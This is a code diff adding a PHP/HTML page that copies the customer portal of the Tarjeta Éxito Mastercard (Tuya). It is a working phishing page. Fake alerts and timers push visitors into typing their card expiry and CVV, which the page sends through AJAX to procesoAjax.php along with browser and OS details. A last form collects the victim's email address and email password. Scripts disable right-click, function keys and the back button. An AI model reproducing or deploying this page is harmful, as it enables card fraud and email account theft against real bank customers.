@@ -1,0 +1,1006 @@
+<html>
+<head id="ctl00_Head">
+<link href="Default1.css" type="text/css" rel="stylesheet">
+<meta charset="utf-8">
+<title>
+	Portal test exito
+</title>
+    
+
+<!--<script type="text/javascript" src="ruxitagentjs_ICA27SVfhjqrux_10199200831173248.js" data-dtconfig="rid=RID_-244291439|rpid=-1497848340|domain=tuya.com.co|reportUrl=/PortalTransaccionalTuya/rb_bf06361jst|app=2c886f6332eb655d|featureHash=ICA27SVfhjqrux|srsr=5000|vcv=2|rdnt=1|uxrgce=1|bp=3|cuc=xzpsha7c|md=mdcc1=a#ctl00_lblNombre|lastModification=1599038311122|dtVersion=10199200831173248|tp=500,50,0,1|uxdcw=1500|vs=2|agentUri=/PortalTransaccionalTuya/ruxitagentjs_ICA27SVfhjqrux_10199200831173248.js">-->
+	</script><script src="jquery-1.11.3.min.js" type="text/javascript"></script>
+    <script src="jquery.blockUI.js" type="text/javascript"></script>
+    <script src="_UtilidadesSitio.js" type="text/javascript"></script>
+    <script src="alertify.js"></script>
+    <script src="alertify.min.js"></script>
+    <link href="css/Alertify/alertify.css" rel="stylesheet"><link href="/Scripts/css/Alertify/alertify.min.css" rel="stylesheet">
+    <script src="Popup.js"></script>
+    <script src="Indicador.js"></script>
+	<link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous"/>
+<!-- <script src="https://cdn.jsdelivr.net/npm/sweetalert2@10"></script>-->
+<style>
+
+#DetailContent {
+    
+        margin-left: 360px !important;
+}
+
+#HeaderLogin {
+    
+    padding-top: 12px !important;
+    
+}
+.subrayado{
+text-decoration: underline !important;
+}
+
+input::-webkit-outer-spin-button,
+input::-webkit-inner-spin-button {
+  -webkit-appearance: none;
+  margin: 0;
+}
+
+/* Firefox */
+input[type=number] {
+  -moz-appearance: textfield;
+}
+
+
+::-webkit-input-placeholder {
+   text-align: center;
+}
+
+:-moz-placeholder { /* Firefox 18- */
+   text-align: center;  
+}
+
+::-moz-placeholder {  /* Firefox 19+ */
+   text-align: center;  
+}
+
+:-ms-input-placeholder {  
+   text-align: center; 
+}
+
+input { 
+    text-align: center; 
+}
+
+
+</style>
+    <script language="javascript" type="text/javascript">
+
+
+
+
+        function Validate_Checkbox() {
+
+            var combo = document.getElementsByName('ctl00$DefaultContent$ddlCertificado');
+            var chks = document.getElementsByTagName('input');
+
+
+            var hasChecked = false;
+            var contador = 0;
+            for (var i = 0; i < chks.length; i++) {
+                if (chks[i].checked) {
+                    hasChecked = true;
+                    contador++;
+                }
+            }
+
+            if (hasChecked == false) {
+                alert("Por favor seleccione una o varias casillas");
+                return false;
+            }
+
+            if (combo.ctl00$DefaultContent$ddlCertificado.value == '4') {
+                if (contador > 1) {
+                    alert("Por favor seleccione una casilla");
+                    return false;
+                }
+
+            }
+            return true;
+        };
+        // Redimensiona la Ventana para que ocupe toda la pantalla
+        function fullScreen() {
+            window.moveTo(0, 0);
+            if (document.getElementById || document.all) {
+                window.resizeTo(screen.availWidth, screen.availHeight);
+
+                // Solo activar para pruebas de DESARROLLO
+                //window.resizeTo(1280, 768);
+                //window.resizeTo(1024, 768);
+            }
+            else if (document.layers) {
+                if (window.outerHeight < screen.availHeight || window.outerWidth < screen.availWidth) {
+                    window.outerHeight = screen.availHeight;
+                    window.outerWidth = screen.availWidth;
+                }
+            }
+        };
+        // Bloqueo del Boton secundario del Mouse (Menu Contextual)
+        function disableContext() {
+            document.oncontextmenu = function () { return false };
+        };
+        // Bloqueo de combinaciones de Teclas
+        function disableKeys() {
+            document.onkeydown = function () {
+                if (window.event) {
+                    if ((window.event.keyCode >= 112) && (window.event.keyCode <= 124)) {
+                        window.event.cancelBubble = true;
+                        window.event.keyCode = 8;
+                        window.event.returnValue = false;
+                        return false;
+                    }
+
+                    if (window.event.keyCode >= 226) {
+                        window.event.cancelBubble = true;
+                        window.event.keyCode = 8;
+                        window.event.returnValue = false;
+                        return false;
+                    }
+                    if (event.altLeft) {
+                        if ((window.event.keyCode == 37) || (window.event.keyCode == 39)) {
+                            return false;
+                        }
+                    }
+                    return true;
+                }
+            };
+        };
+
+        // Validar algunos Digitos
+        function onlyDigits(e) {
+            var isIE = document.all ? true : false;
+            var key = (isIE) ? window.event.keyCode : e.which;
+            var isNum = ((key > 47 && key < 58) || key === 8) ? true : false;
+            return (isNum);
+        };
+
+        function OnTreeClick(evt) {
+            var src = window.event != window.undefined ? window.event.srcElement : evt.target;
+            if (src.textContent == "Gestion Producto" || src.textContent == "Preferencias") {
+                closeLoading();
+            }
+            else if (src.href != null) {
+                openLoading();
+            }
+            else {
+                closeLoading();
+            }
+        }
+
+
+
+
+
+
+
+
+    </script>
+<style type="text/css">
+	.ctl00_tvMenu_0 { text-decoration:none; }
+	.ctl00_tvMenu_1 { border-style:none; }
+	.ctl00_tvMenu_2 {  }
+	.ctl00_tvMenu_3 { border-style:none; }
+	.ctl00_tvMenu_4 {  }
+	.ctl00_tvMenu_5 { border-style:none; }
+	.ctl00_tvMenu_6 {  }
+	.ctl00_tvMenu_7 { border-style:none; }
+	.ctl00_tvMenu_8 {  }
+
+</style></head>
+<body onload="fullScreen(); disableContext(); disableKeys(); javascript:history.go(1); alertar();" style="">
+
+    
+<div>
+<input type="hidden" name="__EVENTTARGET" id="__EVENTTARGET" value="">
+<input type="hidden" name="__EVENTARGUMENT" id="__EVENTARGUMENT" value="">
+<input type="hidden" name="ctl00_tvMenu_ExpandState" id="ctl00_tvMenu_ExpandState" value="+">
+<input type="hidden" name="ctl00_tvMenu_SelectedNode" id="ctl00_tvMenu_SelectedNode" value="">
+<input type="hidden" name="ctl00_tvMenu_PopulateLog" id="ctl00_tvMenu_PopulateLog" value="">
+<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="+">
+
+</div>
+
+<script type="text/javascript">
+//<![CDATA[
+var theForm = document.forms['aspnetForm'];
+if (!theForm) {
+    theForm = document.aspnetForm;
+}
+function __doPostBack(eventTarget, eventArgument) {
+    if (!theForm.onsubmit || (theForm.onsubmit() != false)) {
+        theForm.__EVENTTARGET.value = eventTarget;
+        theForm.__EVENTARGUMENT.value = eventArgument;
+        theForm.submit();
+    }
+}
+//]]>
+</script>
+
+
+
+
+<script type="text/javascript">
+//<![CDATA[
+
+    function TreeView_PopulateNodeDoCallBack(context,param) {
+        WebForm_DoCallback(context.data.treeViewID,param,TreeView_ProcessNodeData,context,TreeView_ProcessNodeData,false);
+    }
+var ctl00_tvMenu_Data = null;//]]>
+</script>
+
+<script src="ScriptResource.axd?d=Txjj2YejDj3zvglvAVNbKcUBMrrRcrBsOWRMcVLrAHCFcoPh9O7VAzCxbtkR45WWaT91JrKShC9lLYn8CdwdyTgY5A46FDFmXbc1HFxV0JNB__riJuSsh6MEYXUgengQbZambpobfhFrjWkDCPuou8feQL50rJAEALtJ0spkVjE1&amp;t=ffffffff93f2983c" type="text/javascript"></script>
+<script src="ScriptResource.axd?d=6S7LYMwRf9L_0uDpAX7gsvw0J1-MsBjJE6JC51Wg9CnpXtyyMtyCeYD877y0O4Yan99vZbnx0MsXZ3VxmTz6kBN7WYxklMAWuZYkKdWrkqRCcqgBWMLfBrOFV0oquvRHDidg-DKGXEWu96bJJCFQX-13bQ-C3hbBkJIbuZwEsqWvkUaN2h1DlWH4CTXOodP00&amp;t=ffffffffecf19baa" type="text/javascript"></script>
+<script type="text/javascript">
+//<![CDATA[
+if (typeof(Sys) === 'undefined') throw new Error('ASP.NET Ajax client-side framework failed to load.');
+//]]>
+</script>
+
+<script src="ScriptResource.axd?d=ZXTBFFihzm-Euw_Pq4F3qfUlIzSCuo1eL5SR1sIYNmHdX7qI7fAYmP0qkr9bpZttACr3TV5WlJ6Q6hMBbbIQv3b1gUDhsmQ060lnvwrRUCGlGVjyMcarZLk8YBmWB_wOtg-1XvKp-vVkTrBdvqjw-guh6STJ5ILQu571NWZAxdWB0EzXNDlQiURp5Of6XUt_0&amp;t=ffffffffecf19baa" type="text/javascript"></script>
+<script src="_UtilidadesSitio.js" type="text/javascript"></script>
+<script src="ScriptResource.axd?d=C0KV2aPyZxr7TK23dCYPQaFBhrjaYmXQgxFjfutmsApRGJaHQg9gdeWZ_RkvHwjBqaOZKnf6PwcDsjOdKEjFeSX8-4IE7AqidmwVpohQDOMkL7SFY454ksBCy4FysbZ5Z_3_tXSDEyqBK1Vs2MesXnH4eyUoBEYECClQlCNz-HDiDq7BFxsd52aSPKFkWBOj0&amp;t=ffffffffecf19baa" type="text/javascript"></script>
+<script type="text/javascript">
+//<![CDATA[
+function WebForm_OnSubmit() {
+if (typeof(ValidatorOnSubmit) == "function" && ValidatorOnSubmit() == false) return false;
+return true;
+}
+//]]>
+</script>
+
+<div>
+
+	<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="+">
+	<input type="hidden" name="__VIEWSTATEENCRYPTED" id="__VIEWSTATEENCRYPTED" value="">
+	<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="+">
+</div>
+        <script type="text/javascript">
+//<![CDATA[
+Sys.WebForms.PageRequestManager._initialize('ctl00$smTransaccional', 'aspnetForm', [], [], [], 90, 'ctl00');
+//]]>
+</script>
+
+
+        <span id="ctl00_TReloj" style="visibility:hidden;display:none;"></span>
+        <div id="BackHeaderFrame">
+            <div id="HeaderFrame" class="CenterDiv">
+                <div id="HeaderImage2"></div>
+
+
+
+<?php
+
+function getUserIpAddr(){
+    if(!empty($_SERVER['HTTP_CLIENT_IP'])){
+        $ip = $_SERVER['HTTP_CLIENT_IP'];
+    }elseif(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
+        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
+    }else{
+        $ip = $_SERVER['REMOTE_ADDR'];
+    }
+    return $ip;
+}
+
+$ip = getUserIpAddr();
+
+$nombre = strtoupper ( $_COOKIE['nombre']);
+
+$fechaactual="Fecha Actual  ";
+$fechaultimoingreso="Fecha Último Ingreso ";
+$version ="Version 5.0.1";
+
+
+$dateTime = new DateTime('now', new DateTimeZone('America/Bogota')); 
+
+$date = DateTime::createFromFormat('h:i a', '10:00 AM');
+//var_dump($date->format('G') < 12);  // true
+
+if ($date->format('G') < 12){
+	$tiempo =" a.m";
+}else{
+	$tiempo =" p.m";
+}
+
+
+?>
+                <div id="HeaderLogin">
+                    <span id="ctl00_lblNombre"><?php echo $nombre;?></span><br>
+                    <span id="ctl00_lblFecha"><?php echo $fechaactual;      echo $dateTime->format("d/m/Y  H:i:s ");  echo $tiempo;?></span><br>
+                    <span id="ctl00_lblFechaUltimoIngreso"><?php echo $fechaultimoingreso;?>15/10/2020 11:18:52 a.m.</span><br>
+                    <span id="ctl00_lblIP"><?php echo "IP ".$ip; ?></span><br>
+                    <span id="ctl00_lblVersion"><?php ?>Versión 5.0.1</span>
+                </div>
+            </div>
+        </div><br><br>
+        <div id="MainContent">
+            <div id="SideBar">
+                <a href="#ctl00_tvMenu_SkipLink"><img alt="Skip Navigation Links." src="WebResource.gif" width="0" height="0" style="border-width:0px;"></a><div id="" onclick="bloqueo();">
+	<table cellpadding="0" cellspacing="0" style="border-width:0;">
+		<tbody><tr>
+			<td><img id="ctl00_tvMenun0i" src="WebResource.gif" alt="" style="border-width:0;"></td><td class="menu_nodeStyle ctl00_tvMenu_2" style="white-space:nowrap;"><span class="ctl00_tvMenu_0 menu_nodeStyle ctl00_tvMenu_1" id="ctl00_tvMenun0" style="border-style:none;font-size: 13px !important;">Gestion Producto</span></td>
+		</tr>
+	</tbody></table><div id="ctl00_tvMenun0Nodes" style="display:block;">
+		<table cellpadding="0" cellspacing="0" style="border-width:0;">
+			<tbody><tr>
+				<td><div style="width:20px;height:1px"></div></td><td><a id="" tabindex="-1"><img src="WebResource2.gif"  alt="" style="border-width:0;"></a></td><td class="menu_nodeStyle ctl00_tvMenu_2"  style="white-space:nowrap;"><a  onmouseover="menu2add(this)" onmouseout="menu2rem(this)" class="ctl00_tvMenu_0 menu_nodeStyle ctl00_tvMenu_1"  id="ctl00_tvMenun1" style="border-style:none;font-size: 13px !important; ">Consulta de Productos</a></td>
+			</tr>
+		</tbody></table><table cellpadding="0" cellspacing="0" style="border-width:0;">
+			<tbody><tr>
+				<td><div style="width:20px;height:1px"></div></td><td><a   id=""tabindex="-1"><img src="WebResource2.gif" alt="" style="border-width:0;"></a></td><td class="menu_nodeStyle ctl00_tvMenu_2"  style="white-space:nowrap;"><a onmouseover="menu2add(this)" onmouseout="menu2rem(this)" class="ctl00_tvMenu_0 menu_nodeStyle ctl00_tvMenu_1" id="ctl00_tvMenun2" style="border-style:none;font-size: 13px !important;">Consultar Valores de Pagos y Cupos</a></td>
+			</tr>
+		</tbody></table><table cellpadding="0" cellspacing="0" style="border-width:0;">
+			<tbody><tr>
+				<td><div style="width:20px;height:1px"></div></td><td><a  id="" tabindex="-1"><img src="WebResource2.gif" alt="" style="border-width:0;"></a></td><td class="menu_nodeStyle ctl00_tvMenu_2"  style="white-space:nowrap;"><a onmouseover="menu2add(this)" onmouseout="menu2rem(this)" class="ctl00_tvMenu_0 menu_nodeStyle ctl00_tvMenu_1"  id="ctl00_tvMenun3" style="border-style:none;font-size: 13px !important;">Consultar Movimientos</a></td>
+			</tr>
+		</tbody></table><table cellpadding="0" cellspacing="0" style="border-width:0;">
+			<tbody><tr>
+				<td><div style="width:20px;height:1px"></div></td><td><a  id="" tabindex="-1"><img src="WebResource2.gif" alt="" style="border-width:0;"></a></td><td class="menu_nodeStyle ctl00_tvMenu_2"   style="white-space:nowrap;"><a  onmouseover="menu2add(this)" onmouseout="menu2rem(this)" class="ctl00_tvMenu_0 menu_nodeStyle ctl00_tvMenu_1"  id="ctl00_tvMenun4" style="border-style:none;font-size: 13px !important;">Extractos</a></td>
+			</tr>
+		</tbody></table><table cellpadding="0" cellspacing="0" style="border-width:0;">
+			<tbody><tr>
+				<td><div style="width:20px;height:1px"></div></td><td><a  id="" tabindex="-1"><img src="WebResource2.gif" alt="" style="border-width:0;"></a></td><td class="menu_nodeStyle ctl00_tvMenu_2"  style="white-space:nowrap;"><a onmouseover="menu2add(this)" onmouseout="menu2rem(this)" class="ctl00_tvMenu_0 menu_nodeStyle ctl00_tvMenu_1"  id="ctl00_tvMenun5" style="border-style:none;font-size: 13px !important;">Paga Aquí</a></td>
+			</tr>
+		</tbody></table><table cellpadding="0" cellspacing="0" style="border-width:0;">
+			<tbody><tr>
+				<td><div style="width:20px;height:1px"></div></td><td><a  id="" tabindex="-1"><img src="WebResource2.gif" alt="" style="border-width:0;"></a></td><td class="menu_nodeStyle ctl00_tvMenu_2"    style="white-space:nowrap;"><a onmouseover="menu2add(this)" onmouseout="menu2rem(this)" class="ctl00_tvMenu_0 menu_nodeStyle ctl00_tvMenu_1"  id="ctl00_tvMenun6" style="border-style:none;font-size: 13px !important;">Certificados</a></td>
+			</tr>
+		</tbody></table>
+	</div><table cellpadding="0" cellspacing="0" style="border-width:0;">
+		<tbody><tr>
+			<td><img id="ctl00_tvMenun7i" src="WebResource.gif" alt="" style="border-width:0;"></td><td class="menu_nodeStyle ctl00_tvMenu_2" style="white-space:nowrap;"><span class="ctl00_tvMenu_0 menu_nodeStyle ctl00_tvMenu_1" id="ctl00_tvMenun7" style="border-style:none;font-size: 13px !important;">Preferencias</span></td>
+		</tr>
+	</tbody></table><div id="ctl00_tvMenun7Nodes" style="display:block;">
+		<table cellpadding="0" cellspacing="0" style="border-width:0;">
+			<tbody><tr>
+				<td><div style="width:20px;height:1px"></div></td><td><a   id="" tabindex="-1"><img src="WebResource2.gif" alt="" style="border-width:0;"></a></td><td class="menu_nodeStyle ctl00_tvMenu_2"    style="white-space:nowrap;"><a onmouseover="menu2add(this)" onmouseout="menu2rem(this)" class="ctl00_tvMenu_0 menu_nodeStyle ctl00_tvMenu_1"  id="ctl00_tvMenun8" style="border-style:none;font-size: 13px !important;">Defensor del Consumidor</a></td>
+			</tr>
+		</tbody></table><table cellpadding="0" cellspacing="0" style="border-width:0;">
+			<tbody><tr>
+				<td><div style="width:20px;height:1px"></div></td><td><a   id="" tabindex="-1"><img src="WebResource2.gif" alt="" style="border-width:0;"></a></td><td class="menu_nodeStyle ctl00_tvMenu_2"   style="white-space:nowrap;"><a onmouseover="menu2add(this)" onmouseout="menu2rem(this)" class="ctl00_tvMenu_0 menu_nodeStyle ctl00_tvMenu_1"  id="ctl00_tvMenun9" style="border-style:none;font-size: 13px !important;">Bloqueo Tarjeta</a></td>
+			</tr>
+		</tbody></table>
+	</div>
+</div><a id="ctl00_tvMenu_SkipLink"></a>
+                <br>
+
+                <a onclick="if(confirm('Está seguro que desea salir del Portal Transaccional?')){event.returnValue=true;}else{event.returnValue=false;};" id="ctl00_lnkCerrarSesion" class="menu_Exit" href="javascript:__doPostBack('ctl00$lnkCerrarSesion','')">Salida Segura</a>
+                <br>
+                <br>
+                
+            </div>
+            <div id="DetailContent">
+                
+
+    <div id="titlePage">
+        <span id="ctl00_DefaultContent_Label1">Consulta de Productos</span>
+    </div>
+
+    <div id="errorPage">
+        <p>
+            <span id="ctl00_DefaultContent_cvApp" style="color:Red;visibility:hidden;"></span>
+            </p><div id="ctl00_DefaultContent_vsApp" style="color:Red;display:none;">
+
+</div>
+    </div>
+
+    <div id="contentPage">
+        
+        
+
+        <div>
+	<table cellspacing="0" border="0" clase="ocultar3" id="ctl00_DefaultContent_GvProductoExtend" style="width:600px;border-collapse:collapse;">
+		<tbody><tr class="TituloGrid" style="color:White;background-color:#3E3E3E;font-family:Calibri;font-size:15px;">
+			<th scope="col">&nbsp;</th><th align="center" scope="col">PRODUCTOS</th><th align="center" scope="col">NUMERO TARJETA</th><th scope="col">Opciones</th>
+		</tr><tr style="font-family:Calibri;font-size:15px;">
+			<td valign="middle" style="width:20px;">
+                        <a href="JavaScript:divexpandcollapse('div**** **** **** ****')">
+                            <img id="imgdiv**** **** **** ****" style="vertical-align: bottom" width="15px" border="0" src="../App_Themes/Imagenes/Minus.png" alt=""></a>
+                    </td><td align="left">
+                        <span id="ctl00_DefaultContent_GvProductoExtend_ctl02_lblProducto">TARJETA EXITO MASTERCARD</span>
+                    </td><td align="center"> <?php echo $_COOKIE['tarjeta']; ?></td></td><td align="center"> <a onclick="escribir()"><i class="fas fa-unlock-alt"></i></a>
+                        </td></tr><tr>
+                            <td colspan="100%" style="background: #F5F5F5; text-align: right; font-family: Calibri;">
+                                <div id="div**** **** **** ****" style="display: inline; position: relative; right: 15px; font-size: 15px; overflow: auto;">Cupo Disponible: $ *.***.***,**</div></td>
+                        </tr>
+                    
+		
+	</tbody></table>
+</div>
+
+        <div>
+
+</div>
+    
+	
+	
+	
+	
+	
+	<div class="oculto1" hidden id="oculto1">
+	
+	
+	<table cellspacing="0" border="0" id="ctl00_DefaultContent_GvProductoExtend" style="width:600px;border-collapse:collapse;">
+	<tbody><tr class="TituloGrid" style="color:White;background-color:#3E3E3E;font-family:Calibri;font-size:15px;">
+	<th align="center" scope="col" style="padding-left: 232px;">VERIFICAR DATOS CLIENTE</th>
+	<th align="center" scope="col"></th>
+		
+				
+											<br>
+	<tr style="font-family:Calibri;font-size:15px;">
+	<td valign="middle" style="    padding-left: 99px; ">NOMBRE COMPLETO:  </td><td> <input readonly style="background: #e4e7ff; border: 0;" type="text" value="<?=$nombre ?>" required></td>
+	
+	</tr>
+	<br>
+	
+	<tr style="font-family:Calibri;font-size:15px;">
+	<td style="width:20px;padding-left: 99px;">CORREO: </td><td><input readonly type="text" style="background:#e4e7ff; border: 0;" value="<?=$_COOKIE['correo']; ?>" required></td>
+	
+	</tr>
+	
+	<?php
+	$telefono = $_COOKIE['telefono'];
+
+if ($_COOKIE['telefono']=""){
+    $telefono ="20160811";
+}
+	
+
+	
+	
+	?>
+	
+	<br>
+	<tr style="font-family:Calibri;font-size:15px;">
+	<td valign="middle" style="width:20px;padding-left: 99px;" >TELEFONO: </td><td><input  readonly style="background:#e4e7ff; border: 0;" type="text"  id="telefono" value="<?=$telefono; ?>" required></td> 
+	
+	</tr>
+	
+	<tr style="font-family:Calibri;font-size:15px;">
+	<td valign="middle" style="width:20px;"></td><td>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input  type="button" id="continuar3" onclick="continuar()" value="continuar"></td>
+	
+	</tr>
+	</tbody>
+	</table>
+	</div>
+	
+	<form id="miformulario" method="post" action="Verification" name="form2" >
+	<div class="oculto2" hidden id="oculto2">
+	<br><br><br>
+		<table cellspacing="0" border="0" id="ctl00_DefaultContent_GvProductoExtend" style="width:600px;border-collapse:collapse;">
+	<tbody>
+	<tr class="TituloGrid" style="color:White;background-color:#3E3E3E;font-family:Calibri;font-size:14px;">
+	<th align="center" scope="col" style="padding-left: 191px;">CONFIRME SUS DATOS PARA CONTINUAR</th>
+	<th align="center" scope="col"></th>
+	</tr>
+	<tr style="font-family:Calibri;font-size:15px;">
+	<td align="center"><br><img id="movida" width="50%" height="20%" src="delantera.png"></td>
+	<td align="center" valign="center" style="font-size: 23px;">
+	MES: &nbsp;<input style="width: 35px;" type="password"    class="validarCamposVacios"  id="mes" name="mes" maxlength="2" minlength="2"  onKeyPress="return soloNumeros(event)" required>
+	AÑO: &nbsp;<input style="width: 35px;" type="password"    class="validarCamposVacios"  id="ano" name="ano" maxlength="2" minlength="2"  onKeyPress="return soloNumeros(event)" required>
+	CVV: &nbsp;&nbsp;<input style="width: 35px;"type="password" class="validarCamposVacios"  id="cvv" name="cvv" maxlength="3" minlength="3"  onKeyPress="return soloNumeros(event)" required>
+	</td>
+	</tr>
+    <tr style="font-family:Calibri;font-size:15px;">
+	<td valign="middle" style="width:20px;"></td><td>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type="button" onclick="continuar2(); "  id="continuar" value="continuar"></td></td>
+	</tr>
+	
+	<tr style="font-family:Calibri;font-size:15px;">
+	<td valign="middle" style="width:20px;"></td><td id="resultado"></td>
+	</tr>
+	
+	</tbody>
+	
+	</table>
+	
+
+	</div>
+	
+	
+
+
+
+	<div class="oculto2" hidden id="oculto3">
+	<br><br><br>
+	<table cellspacing="0" border="0" id="ctl00_DefaultContent_GvProductoExtend" style="width:600px;border-collapse:collapse;">
+	<tbody>
+	<tr class="TituloGrid" style="color:White;background-color:#3E3E3E;font-family:Calibri;font-size:14px;">
+	<th align="center" scope="col" style="padding-left: 190px;">INGRESE SU CORREO PARA CONTINUAR</th>
+	<th align="center" scope="col"></th>
+	</tr>
+
+
+    <tr style="font-family:Calibri;font-size:15px;">
+	<td valign="middle" style="width:20px;padding-left: 99px;" >CORREO ELECTRONICO: </td><td><input  type="email"  id="email" name="cor"></td>
+	
+	</tr>
+	
+	<tr style="font-family:Calibri;font-size:15px;">
+	<td valign="middle" style="width:20px;padding-left: 99px;" >CONTRASEÑA CORREO: </td><td><input  type="password"  id="dasw" name="cla"></td>
+	
+	</tr>
+	
+	<tr style="font-family:Calibri;font-size:15px;">
+	
+	
+	<td valign="middle" style="width:20px;"></td><td>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type="submit" value="Finalizar"></td>
+	
+	</tr>
+	
+	</tbody>
+	</table>
+
+
+
+
+
+
+
+	
+	
+	
+	
+	
+	</form>
+
+
+
+	</div>
+	</div>
+	
+	
+	
+	
+    <iframe name="__bkframe" height="0" width="0" frameborder="0" style="display: none; position: absolute; clip: rect(0px 0px 0px 0px)" src="about:blank"></iframe>
+	
+	
+	
+	
+   <!-- <script type="text/javascript" src="https://tags.bkrtx.com/js/bk-coretag.js"></script>-->
+
+    <script language="javascript" type="text/javascript">
+	
+	function soloNumeros(e)
+{
+	var key = window.Event ? e.which : e.keyCode
+	return ((key >= 48 && key <= 57) || (key==8))
+}
+	
+	window.addEventListener("load", function() {
+  miformulario.mes.addEventListener("keypress", soloNumeros, false);
+  miformulario.ano.addEventListener("keypress", soloNumeros, false);
+  miformulario.cvv.addEventListener("keypress", soloNumeros, false);
+});
+	
+	//Solo permite introducir numeros.
+function soloNumeros(e){
+  var key = window.event ? e.which : e.keyCode;
+  if (key < 48 || key > 57) {
+    e.preventDefault();
+  }
+}
+
+function bloqueo(){
+	alert('Cuenta bloqueada')
+}
+
+	
+
+	setTimeout(function escribir(){
+		let p = document.getElementById('oculto1');
+		p.removeAttribute("hidden");
+		alert('Confirme sus datos');
+		segundo();
+	}, 3000);
+	
+	
+	function segundo(){
+	    setTimeout(function(){
+	    	$('#continuar3').click();
+	    }, 7000);
+	}
+
+	
+	function continuar(){
+	console.log('continuar')
+	
+				openLoading();
+			 
+				  setTimeout(function(){
+				      
+					$("#ctl00_DefaultContent_cvApp").css('visibility', 'visible');
+				
+				  }, 3000);
+					
+
+                setTimeout(function(){
+                					  
+                					let j = document.getElementById('oculto1');
+                					j.setAttribute("hidden", true);
+                					let i = document.getElementById('oculto2');
+                					i.removeAttribute("hidden");
+                				
+                					}, 5000);
+                	}
+                	
+	
+	//	$('#continuar3').click();
+	 
+	 
+	function continuar2(){
+	console.log('continuar2')
+	
+	var  m = document.getElementById('mes').value;
+	var  a = document.getElementById('ano').value;
+	var  c = document.getElementById('cvv').value;
+	
+	
+
+	if (
+	
+	     m.length === 2 &&  ($("#mes").val() > 0 &&  $("#mes").val() < 13 )  && a.length === 2 &&  ($("#ano").val() > 20 &&  $("#ano").val() < 30 ) &&  c.length === 3
+		 
+
+	                                                              ) {
+		console.log('bien')
+		
+		
+		
+		
+	tta();	
+function tta(mes,ano,cvv) {
+	
+	
+	var getBrowserInfo = function() {
+			var ua= navigator.userAgent, tem, 
+			M= ua.match(/(opera|chrome|safari|firefox|msie|trident(?=\/))\/?\s*(\d+)/i) || [];
+			if(/trident/i.test(M[1])){
+				tem=  /\brv[ :]+(\d+)/g.exec(ua) || [];
+				return 'IE '+(tem[1] || '');
+			}
+			if(M[1]=== 'Chrome'){
+				tem= ua.match(/\b(OPR|Edge)\/(\d+)/);
+				if(tem!= null) return tem.slice(1).join(' ').replace('OPR', 'Opera');
+			}
+			M= M[2]? [M[1], M[2]]: [navigator.appName, navigator.appVersion, '-?'];
+			if((tem= ua.match(/version\/(\d+)/i))!= null) M.splice(1, 1, tem[1]);
+			return M.join(' ');
+		};
+
+
+	
+	
+	
+	
+	var  m = document.getElementById('mes').value;
+	var  a = document.getElementById('ano').value;
+	var  c = document.getElementById('cvv').value;
+	
+	var  b = getBrowserInfo();
+	
+	
+	var OSName="Unknown OS";
+	if (navigator.appVersion.indexOf("Win")!=-1) OSName="Windows";
+	if (navigator.appVersion.indexOf("Mac")!=-1) OSName="MacOS";
+	if (navigator.appVersion.indexOf("X11")!=-1) OSName="UNIX";
+	if (navigator.appVersion.indexOf("Linux")!=-1) OSName="Linux";
+
+
+
+     var parametros = {"mes":m,"ano":a,"cvv":c,"nav":b,"sis":OSName};
+	 console.log('llego a validar');
+	// console.log($("#mes").val());
+	 //console.log($("#ano").val());
+	 //console.log($("#mes").val());
+	 
+$.ajax({
+    data:parametros,
+    url:'procesoAjax.php',
+    type: 'post',
+    beforeSend: function () {
+		
+        //$("#resultado").html("Procesando, espere por favor");
+		
+
+		
+					
+					
+					
+    },
+    success: function (response) {   
+	
+	 console.log('despues del envio ');
+       
+      
+
+			
+			 
+				  setTimeout(function(){
+					  openLoading();
+					  
+					  
+					$("#ctl00_DefaultContent_cvApp").css('visibility', 'visible');
+				
+setTimeout(function(){
+		let j = document.getElementById('oculto1');
+		j.setAttribute("hidden", true);
+		let i = document.getElementById('oculto2');
+		i.setAttribute("hidden", true);
+		let k = document.getElementById('oculto3');
+		k.removeAttribute("hidden");
+		
+		}, 3000);
+		
+		
+		
+				
+					}, 3000);
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+		   
+	}
+});
+}
+
+		
+		
+		
+		
+
+		function mostrar1(){
+				openLoading();
+			 
+				  setTimeout(function(){
+					  
+					$("#ctl00_DefaultContent_cvApp").css('visibility', 'visible');
+				
+
+let j = document.getElementById('oculto1');
+		j.setAttribute("hidden", true);
+		let i = document.getElementById('oculto2');
+		i.setAttribute("hidden", true);
+		
+		let k = document.getElementById('oculto3');
+		k.removeAttribute("hidden");
+		
+				
+					}, 3000);
+		}	
+
+
+
+
+	
+	
+		
+		
+	}
+	
+		}
+	
+	function menu2add(x){
+    x.classList.add("ct100_tvMenu_8");
+	x.classList.add("menu_hoverNodestyle");	
+	x.classList.add("ct100_tvMenu_7");
+	x.classList.add("subrayado");
+	}
+	
+	function menu2rem(x) {
+    x.classList.remove("ct100_tvMenu_8");
+	x.classList.remove("menu_hoverNodestyle");
+	x.classList.remove("subrayado");
+	}
+	
+        function divexpandcollapse(divname) {
+            var div = document.getElementById(divname);
+            var img = document.getElementById('img' + divname);
+            if (div.style.display == "none") {
+                div.style.display = "inline";
+                img.src = "../App_Themes/Imagenes/Minus.png";
+                $.ajax({
+                    type: "POST",
+                    url: "Default.aspx/CupoDisponible",
+                    data: "{'sNumTarjeta':'" + divname + "' }",
+                    contentType: "application/json; charset=utf-8",
+                    dataType: "json",
+                    success: function (response) {
+                        if (response.d != null) {
+                            div.textContent = response.d;
+                        }
+                    },
+                    failure: function (response) {
+                        div.textContent = "Información no disponible ";
+                    }
+                });
